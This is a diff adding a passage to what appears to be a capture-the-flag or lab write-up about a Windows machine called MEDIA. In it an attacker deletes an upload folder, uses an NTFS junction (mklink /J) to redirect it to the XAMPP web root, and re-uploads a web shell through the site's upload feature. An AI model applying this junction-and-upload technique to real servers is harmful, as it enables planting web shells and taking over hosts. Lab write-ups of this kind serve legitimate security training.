@@ -486,6 +486,34 @@ enox@MEDIA c:\Windows\Tasks\Uploads>
 
 ```
 
+```
+enox@MEDIA c:\Windows\Tasks\Uploads>del .\ae9dc0285a79ec82ea1e2bfc009adf49   
+c:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49\*, Are you sure (Y/N)? y
+
+```
+
+error:
+
+```
+enox@MEDIA c:\Windows\Tasks\Uploads>cmd /c mklink /J C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49 C:\xampp\htdocs
+Cannot create a file when that file already exists.
+```
+
+```
+enox@MEDIA c:\Windows\Tasks\Uploads>rmdir ae9dc0285a79ec82ea1e2bfc009adf49
+```
+
+```
+enox@MEDIA c:\Windows\Tasks\Uploads>cmd /c mklink /J C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49 C:\xampp\htdocs
+Junction created for C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49 <<===>> C:\xampp\htdocs
+```
+
+reuploading the shell using the file uploading feature:
+
+img 3
+
+
+
 ---
 ## Remediation
 
